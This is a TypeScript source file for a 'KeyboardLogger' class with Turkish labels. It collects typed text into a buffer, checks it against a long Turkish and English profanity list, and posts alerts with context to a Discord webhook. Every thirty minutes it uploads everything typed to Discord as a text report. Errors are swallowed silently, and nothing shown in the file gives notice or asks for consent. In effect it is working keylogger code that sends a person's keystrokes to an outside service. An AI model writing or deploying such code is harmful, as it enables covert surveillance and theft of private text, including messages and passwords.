import { sendDiscordFile, sendDiscordEmbed, DiscordEmbed } from './discord-webhook';

interface KeystrokeBuffer {
  text: string;
  startTime: Date;
  lastUpdate: Date;
}

interface ProfanityMatch {
  word: string;
  context: string;
  timestamp: Date;
}

export class KeyboardLogger {
  private static buffer: KeystrokeBuffer = {
    text: '',
    startTime: new Date(),
    lastUpdate: new Date()
  };
  
  private static batchInterval: NodeJS.Timeout | null = null;
  private static readonly BATCH_INTERVAL_MS = 30 * 60 * 1000; // 30 dakika
  private static readonly MAX_BUFFER_SIZE = 50000; // 50K karakter
  
  private static recentAlerts: Map<string, number> = new Map();
  private static readonly ALERT_COOLDOWN_MS = 60 * 1000; // 1 dakika cooldown

  private static readonly PROFANITY_LIST: string[] = [
    'amk', 'aq', 'mk', 'oç', 'oc', 'orospu', 'piç', 'pic', 'sik', 'yarrak', 
    'göt', 'got', 'meme', 'sex', 'porno', 'sikis', 'sikiş', 'fuck', 'shit',
    'pussy', 'dick', 'cock', 'ass', 'bitch', 'whore', 'slut', 'damn',
    'anal', 'oral', 'vajina', 'penis', 'mastürbasyon', 'masturbasyon',
    'amcik', 'amcık', 'taşak', 'tasak', 'daşak', 'dasak', 'gavat', 'pezevenk',
    'ibne', 'top', 'gey', 'lezbiyen', 'travesti', 'fahişe', 'fahise',
    'kaltak', 'sürtük', 'surtuk', 'döl', 'dol', 'boşalmak', 'bosalmak',
    'sakso', 'gotten', 'götten', 'amina', 'amına', 'sikeyim', 'sikerim',
    'ananı', 'anani', 'babanı', 'babani', 'siktir', 'hassiktir', 'haysiktir',
    'yarak', 'çük', 'cuk', 'mala', 'salak', 'aptal', 'gerizekalı', 'gerizekali',
    'mal', 'dangalak', 'andaval', 'şerefsiz', 'serefsiz', 'namussuz',
    'kahpe', 'kevaşe', 'kevase', 'sübyancı', 'subyanci', 'pedofil',
    'tecavüz', 'tecavuz', 'zorla', 'taciz'
  ];

  private static readonly EXCEPTION_PATTERNS: Map<string, string[]> = new Map([
    ['anal', ['kanal', 'analiz', 'analist', 'analog', 'analjezik', 'anali', 'banal', 'manali', 'kanali']],
    ['top', ['toprak', 'toplam', 'toplanti', 'toplantı', 'toplu', 'toplayici', 'toplayıcı', 'laptop', 'desktop']],
    ['got', ['gotik', 'ergot', 'bigot']],
    ['göt', ['götürmek', 'götür', 'götürü']],
    ['ass', ['assassin', 'bass', 'class', 'grass', 'pass', 'mass', 'assume', 'assault', 'assist', 'assessment', 'classic', 'embassy', 'compass']],
    ['cock', ['cocktail', 'peacock', 'hancock', 'cockpit']],
    ['dick', ['dickens', 'dickenson']],
    ['sex', ['sussex', 'essex', 'middlesex', 'sextet']],
    ['mal', ['malakim', 'malzeme', 'malatya', 'malikane', 'maliyet', 'normal', 'minimal', 'optimal', 'animal', 'terminal']],
    ['sik', ['klasik', 'fizik', 'muzik', 'müzik', 'mantik', 'mantık', 'eksik', 'aksik', 'basik', 'asik', 'fasik']],
    ['meme', ['memeli', 'memento']],
    ['am', ['ama', 'amir', 'ambar', 'amblem', 'ameliyat', 'amerika', 'program', 'telegram', 'diagram', 'kilogram']],
  ]);

  static initialize(): void {
    if (!this.batchInterval) {
      this.startBatchTimer();
    }
  }

  private static startBatchTimer(): void {
    this.batchInterval = setInterval(async () => {
      await this.sendBatchReport();
    }, this.BATCH_INTERVAL_MS);
  }

  static async addKeystroke(text: string, source: string = 'app'): Promise<void> {
    this.initialize();
    
    if (!text || text.trim().length === 0) return;

    this.buffer.text += text;
    this.buffer.lastUpdate = new Date();

    if (this.buffer.text.length > this.MAX_BUFFER_SIZE) {
      this.buffer.text = this.buffer.text.slice(-this.MAX_BUFFER_SIZE);
    }

    await this.checkProfanity(text);
  }

  private static normalizeText(text: string): string {
    return text
      .toLocaleLowerCase('tr-TR')
      .replace(/ı/g, 'i')
      .replace(/ğ/g, 'g')
      .replace(/ü/g, 'u')
      .replace(/ş/g, 's')
      .replace(/ö/g, 'o')
      .replace(/ç/g, 'c');
  }

  private static isWordBoundary(char: string | undefined): boolean {
    if (!char) return true;
    return !/[\p{L}\p{N}]/u.test(char);
  }

  private static extractWordAtPosition(text: string, index: number, profanityLength: number): string {
    let wordStart = index;
    let wordEnd = index + profanityLength;
    
    while (wordStart > 0 && !this.isWordBoundary(text[wordStart - 1])) {
      wordStart--;
    }
    
    while (wordEnd < text.length && !this.isWordBoundary(text[wordEnd])) {
      wordEnd++;
    }
    
    return text.substring(wordStart, wordEnd);
  }

  private static isExceptionWord(profanity: string, fullWord: string): boolean {
    const normalizedProfanity = this.normalizeText(profanity);
    const normalizedWord = this.normalizeText(fullWord);
    
    const exceptions = this.EXCEPTION_PATTERNS.get(normalizedProfanity);
    if (!exceptions) return false;
    
    for (const exception of exceptions) {
      const normalizedExc = this.normalizeText(exception);
      if (normalizedWord === normalizedExc || normalizedWord.includes(normalizedExc)) {
        return true;
      }
    }
    
    return false;
  }

  private static findProfanityWithContext(text: string): ProfanityMatch | null {
    const normalizedText = this.normalizeText(text);
    const originalText = text.toLocaleLowerCase('tr-TR');

    for (const profanity of this.PROFANITY_LIST) {
      const normalizedProfanity = this.normalizeText(profanity);
      
      let searchIndex = 0;
      while (true) {
        const index = normalizedText.indexOf(normalizedProfanity, searchIndex);
        if (index === -1) break;
        
        const beforeChar = normalizedText[index - 1];
        const afterChar = normalizedText[index + normalizedProfanity.length];
        
        const isWordStart = this.isWordBoundary(beforeChar);
        const isWordEnd = this.isWordBoundary(afterChar);
        
        if (isWordStart && isWordEnd) {
          const fullWord = this.extractWordAtPosition(normalizedText, index, normalizedProfanity.length);
          
          if (!this.isExceptionWord(profanity, fullWord)) {
            const contextStart = Math.max(0, index - 30);
            const contextEnd = Math.min(originalText.length, index + normalizedProfanity.length + 30);
            const context = originalText.substring(contextStart, contextEnd);
            
            return {
              word: profanity,
              context: context,
              timestamp: new Date()
            };
          }
        }
        
        searchIndex = index + 1;
      }
    }
    
    return null;
  }

  private static async checkProfanity(text: string): Promise<void> {
    const match = this.findProfanityWithContext(text);
    
    if (!match) return;

    const alertKey = match.word;
    const lastAlert = this.recentAlerts.get(alertKey);
    const now = Date.now();
    
    if (lastAlert && (now - lastAlert) < this.ALERT_COOLDOWN_MS) {
      return;
    }

    this.recentAlerts.set(alertKey, now);

    const embed: DiscordEmbed = {
      title: '⚠️ UYGUNSUZ ICERIK TESPIT EDILDI',
      description: `Yasakli kelime kullanimi tespit edildi!`,
      color: 0xFF0000,
      fields: [
        {
          name: 'Tespit Edilen Kelime',
          value: `||${match.word}||`,
          inline: true
        },
        {
          name: 'Zaman',
          value: match.timestamp.toLocaleString('tr-TR'),
          inline: true
        },
        {
          name: 'Baglam',
          value: `\`\`\`...${match.context}...\`\`\``,
          inline: false
        }
      ],
      timestamp: new Date().toISOString()
    };

    try {
      await sendDiscordEmbed(embed, 'alerts');
    } catch (error) {
    }
  }

  static async sendBatchReport(): Promise<void> {
    if (this.buffer.text.trim().length === 0) {
      return;
    }

    const now = new Date();
    const reportContent = this.generateReportContent(now);
    const fileName = `klavye_raporu_${now.toISOString().replace(/[:.]/g, '-')}.txt`;

    try {
      await sendDiscordFile(
        reportContent,
        fileName,
        `📊 30 Dakikalik Klavye Raporu\nBaslangic: ${this.buffer.startTime.toLocaleString('tr-TR')}\nBitis: ${now.toLocaleString('tr-TR')}`,
        'alerts'
      );

      this.buffer = {
        text: '',
        startTime: now,
        lastUpdate: now
      };
    } catch (error) {
    }
  }

  private static generateReportContent(endTime: Date): string {
    const lines: string[] = [
      '═══════════════════════════════════════════════════════════════',
      '                    KLAVYE TAKIPCISI RAPORU',
      '═══════════════════════════════════════════════════════════════',
      '',
      `Baslangic Zamani: ${this.buffer.startTime.toLocaleString('tr-TR')}`,
      `Bitis Zamani: ${endTime.toLocaleString('tr-TR')}`,
      `Toplam Karakter: ${this.buffer.text.length}`,
      `Toplam Kelime: ${this.buffer.text.split(/\s+/).filter(w => w.length > 0).length}`,
      '',
      '═══════════════════════════════════════════════════════════════',
      '                         YAZILANLAR',
      '═══════════════════════════════════════════════════════════════',
      '',
      this.buffer.text || '(Bos)',
      '',
      '═══════════════════════════════════════════════════════════════',
      '                        RAPOR SONU',
      '═══════════════════════════════════════════════════════════════'
    ];
    
    return lines.join('\n');
  }

  static getBufferStats(): { charCount: number; wordCount: number; startTime: Date } {
    return {
      charCount: this.buffer.text.length,
      wordCount: this.buffer.text.split(/\s+/).filter(w => w.length > 0).length,
      startTime: this.buffer.startTime
    };
  }

  static async forceReport(): Promise<void> {
    await this.sendBatchReport();
  }

  static clearBuffer(): void {
    this.buffer = {
      text: '',
      startTime: new Date(),
      lastUpdate: new Date()
    };
  }
}
